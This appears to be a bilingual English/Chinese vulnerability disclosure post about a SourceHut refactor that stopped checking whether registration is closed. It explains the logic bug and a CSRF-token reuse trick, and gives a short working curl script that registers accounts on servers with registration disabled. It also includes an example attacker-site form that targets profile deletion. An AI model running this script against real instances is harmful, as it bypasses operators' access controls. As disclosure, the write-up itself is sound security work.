The background# SourceHut has been undergoing quite an architectural change. Its frontend was first built using Flask and Jinja templates and SQLAlchemy. But, for performance reasons, and for other reasons (decoupling of business logic, graphql) the API has been ported over to Go.

背景# SourceHut 正在经历相当大的架构变革。其前端最初是使用 Flask、Jinja 模板和 SQLAlchemy 构建的。但出于性能以及其他原因（业务逻辑解耦、GraphQL），API 已经被迁移到了 Go 语言。

The problem# Back in 2021, while moving registration code from the frontend to the graphql backend, a subtle logic bug got introduced. While the frontend never shows a registration form, and states prominently ‘registration is currently closed’, the form handler is still there. It correctly states that registration is closed on every error path, but on the happy path it does not seem to ever check it. So if you happen to remember how to submit the form…

问题# 回到 2021 年，在将注册代码从前端迁移到 GraphQL 后端时，引入了一个微妙的逻辑漏洞。虽然前端从不显示注册表单，并显著标明“注册当前已关闭”，但表单处理程序依然存在。它在每个错误路径上都能正确提示注册已关闭，但在成功路径上似乎从未进行检查。所以，如果你恰好记得如何提交该表单……

The exploitation# You just need to POST /register/step2 with your desired username, email and password. If the server in question disables registration, but has its SMTP configured properly (you still need to do email confirmation), boom, you are in. There is only one caveat, the csrf token — protection against Cross-Site Request Forgery, like a www.attacker.com containing <form action="https://meta.sr.ht/profile/delete"> (or 307ing there), because yes you can post forms to other sites, and yes the request will carry valid cookies. What other sites cannot know are the values of input fields in the form presented to you specifically, so the typical protection is <input type="hidden" name="_csrf_token" value="1d02711ce5a3a17342...">. There is no registration form displayed, so there is no token. However, fortunately for us attackers, the token from /login works just fine.

利用方式# 你只需要向 /register/step2 发送一个 POST 请求，包含你想要的用户名、邮箱和密码即可。如果目标服务器禁用了注册，但其 SMTP 配置正确（你仍然需要进行邮箱确认），砰，你就进去了。这里只有一个注意事项，即 CSRF 令牌——这是针对跨站请求伪造的保护措施，例如 www.attacker.com 包含一个 <form action="https://meta.sr.ht/profile/delete">（或重定向到那里），因为确实可以将表单提交到其他站点，并且请求会携带有效的 Cookie。其他站点无法获知专门呈现给你的表单中输入字段的值，因此典型的保护方式是 <input type="hidden" name="_csrf_token" value="1d02711ce5a3a17342...">。由于没有显示注册表单，所以也就没有令牌。然而，幸运的是，对于我们攻击者来说，来自 /login 的令牌完全可以使用。

The exploit# #!/bin/sh #META=https://meta.copyleft.market META=http://127.0.0.1:5000 USERNAME=azurediamond EMAIL=test@example.com PASSWORD=hunter2 csrf=$(curl -c cookie.txt $META/login |grep -A1 csrf |cut -d\' -f2 |tail -1) curl -v -b cookie.txt $META/register/step2 \ -d _csrf_token="$csrf" \ -d username="$USERNAME" \ -d email="$EMAIL" \ -d password="$PASSWORD"

Summary# Lessons learned: Refactors can swallow security checks. Double check correctness on auth flows. CSRF protection would prevent this if the token was scope-limited to the specific endpoint each form points to. VulnCheck is nice but their contact channels can still get more responsive.
